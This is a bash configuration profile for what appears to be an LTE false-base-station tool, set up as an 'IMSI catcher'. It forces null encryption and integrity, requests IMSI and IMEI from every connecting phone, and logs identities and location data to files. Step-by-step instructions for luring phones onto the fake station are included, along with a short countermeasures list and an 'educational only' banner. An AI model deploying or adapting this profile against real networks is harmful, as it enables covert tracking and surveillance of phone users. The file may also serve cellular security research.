#!/bin/bash
#####################################################################
# IMSI CATCHER ATTACK PROFILE
# 
# Purpose: Capture IMSI, TMSI, and other subscriber identities
# Method: Disable encryption and request identity from UEs
#
# WARNING: For RESEARCH and EDUCATIONAL purposes ONLY
#####################################################################

# Profile name
ATTACK_NAME="IMSI Catcher"
ATTACK_TYPE="imsi_catcher"

#####################################################################
# SECURITY SETTINGS
#####################################################################
# Force no encryption to capture plaintext identities
SECURITY_EEA_PREF="EEA0"
SECURITY_EIA_PREF="EIA0"
DISABLE_ENCRYPTION=true
DISABLE_INTEGRITY=true

#####################################################################
# IDENTITY REQUEST SETTINGS
#####################################################################
# Aggressively request IMSI from UEs
REQUEST_IMSI=true
REQUEST_IMEI=true
REQUEST_IMEISV=true

# Request identity even when TMSI is available
FORCE_IMSI_REQUEST=true

#####################################################################
# CAPTURE SETTINGS
#####################################################################
# Log file for captured identities
CAPTURE_LOG="/tmp/imsi_catcher_identities.log"
CAPTURE_FORMAT="json"  # json, csv, or text

# What to capture
CAPTURE_IMSI=true
CAPTURE_TMSI=true
CAPTURE_IMEI=true
CAPTURE_IMEISV=true
CAPTURE_LAI=true
CAPTURE_TAI=true
CAPTURE_GUTI=true

# Timestamps
CAPTURE_TIMESTAMP=true
CAPTURE_LOCATION_INFO=true

#####################################################################
# NAS MESSAGE SETTINGS
#####################################################################
# Configuration for NAS message handling
NAS_IDENTITY_REQUEST_ENABLED=true
NAS_AUTHENTICATION_REJECT=false  # Don't reject, capture first
NAS_ATTACH_ACCEPT_DELAY=5  # Delay to ensure capture

#####################################################################
# RRC SETTINGS
#####################################################################
# RRC connection setup parameters
RRC_ACCEPT_ALL_CONNECTIONS=true
RRC_CONNECTION_TIMEOUT=30  # seconds
RRC_LOG_ALL_MESSAGES=true

#####################################################################
# PCAP CAPTURE
#####################################################################
PCAP_ENABLED=true
PCAP_FILE="/tmp/imsi_catcher.pcap"
PCAP_FILTER="nas"  # Capture NAS messages

#####################################################################
# LOGGING
#####################################################################
LOG_LEVEL="debug"
LOG_FILE="/tmp/imsi_catcher_attack.log"
LOG_IDENTITIES_SEPARATELY=true

# Alert on new identity capture
ALERT_ON_CAPTURE=true
ALERT_SOUND=false

#####################################################################
# DESCRIPTION
#####################################################################
ATTACK_DESCRIPTION="IMSI Catcher mode captures subscriber identities by disabling encryption and requesting IMSI/IMEI from connecting UEs."

ATTACK_HOWTO="1. Start legitimate BS first
2. Wait for UE to connect to legitimate BS
3. Start false BS with this profile
4. UE will handover to false BS (higher signal)
5. False BS requests identity without encryption
6. Identities are logged to ${CAPTURE_LOG}"

ATTACK_COUNTERMEASURES="- Use IMSI encryption (SUCI in 5G)
- Monitor for suspicious base stations
- Verify network authentication
- Use SIM cards with IMSI encryption support"

